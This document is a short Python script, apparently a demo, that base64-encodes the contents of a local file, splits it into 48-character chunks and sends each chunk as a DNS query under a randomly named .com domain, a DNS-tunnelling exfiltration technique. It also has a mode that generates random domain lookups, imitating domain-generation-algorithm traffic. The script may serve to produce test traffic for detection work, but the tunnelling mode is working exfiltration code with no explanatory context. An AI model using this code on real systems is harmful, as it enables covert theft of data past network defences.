
import base64 
import socket
import dns.resolver
import random
import string

def randStr(chars = string.ascii_lowercase, N=10):
	return ''.join(random.choice(chars) for _ in range(N))

dns.resolver.Timeout = 1
dns.resolver.lifetime = 1


DOMAIN = "." + randStr(N=10) + ".com"
DEMO = "DGA" #Set to TUNNEL or DGA


data = open('data.txt', 'rb') #open binary file in read mode
data_read = data.read()
encodedBytes = base64.b64encode(data_read)
encodedStr = str(encodedBytes, "utf-8") #converts Base64 to string from bytes

parse = [encodedStr[i:i+48] for i in range(0, len(encodedStr), 48)] #breaks the base64 text file into 48 character chunks and passes to parse

ctr = 0
for dnsquery in parse:
    try:
        if DEMO == "TUNNEL":
            print(dns.resolver.query(parse[ctr]+DOMAIN, "A")) #query DNS Domain
        elif DEMO == "DGA":
            print(dns.resolver.query(randStr(N=3) + "." + randStr(N=10) + ".com", "A"))
    except (dns.resolver.NoAnswer):
        if DEMO == "TUNNEL":
            print("Couldn't find any records (NoAnswer): "+ parse[ctr]+DOMAIN, "A") #Error handling on Timeout
        elif DEMO == "DGA":
            print("Couldn't find any records (NoAnswer): "+ randStr(N=3) + "." + randStr(N=10) + ".com", "A")
    except (dns.resolver.NXDOMAIN):
        if DEMO == "TUNNEL":
            print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN) #Error handling if DNS is cached on host and cant find.
        elif DEMO == "DGA":
            print("Couldn't find any records (NXDOMAIN): " + randStr(N=3) + "." + randStr(N=10) + ".com", "A")
    ctr = ctr + 1